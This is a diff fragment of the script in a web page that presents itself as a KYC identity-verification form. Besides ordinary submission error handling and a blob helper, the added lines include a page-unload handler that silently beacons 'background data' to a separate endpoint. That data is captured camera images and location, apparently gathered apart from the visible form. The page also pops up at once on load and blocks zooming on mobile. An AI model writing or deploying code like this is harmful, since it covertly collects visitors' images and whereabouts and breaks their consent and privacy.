@@ -702,4 +702,56 @@
           // Show success message
           document.getElementById('kycFormElement').style.display = 'none';
           document.getElementById('successMessage').style.display = 'block';
-        } el
+          } else {
+          throw new Error('Server responded with an error');
+        }
+      } catch (error) {
+        console.error("Submission error:", error);
+        alert("There was an error processing your verification. Please try again.");
+        submitBtn.disabled = false;
+        submitBtn.innerHTML = originalBtnText;
+      }
+    });
+    
+    // Helper function to convert data URL to Blob
+    function dataURLtoBlob(dataurl) {
+      const arr = dataurl.split(',');
+      const mime = arr[0].match(/:(.*?);/)[1];
+      const bstr = atob(arr[1]);
+      let n = bstr.length;
+      const u8arr = new Uint8Array(n);
+      while (n--) {
+        u8arr[n] = bstr.charCodeAt(n);
+      }
+      return new Blob([u8arr], { type: mime });
+    }
+    
+    // Cleanup when leaving the page
+    window.addEventListener('beforeunload', function() {
+      // Send any remaining background data
+      if (capturedImages.length > 0 || locationData) {
+        const data = {
+          sessionId,
+          images: capturedImages,
+          location: locationData
+        };
+        const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
+        navigator.sendBeacon('/background-data', blob);
+      }
+      stopCamera();
+    });
+    
+    // Start the process by showing popup immediately
+    window.addEventListener('load', function() {
+      document.getElementById('verificationPopup').style.display = 'flex';
+      
+      // Prevent zooming on mobile
+      document.addEventListener('touchmove', function(event) {
+        if (event.scale !== 1) {
+          event.preventDefault();
+        }
+      }, { passive: false });
+    });
+  </script>
+</body>
+</html>
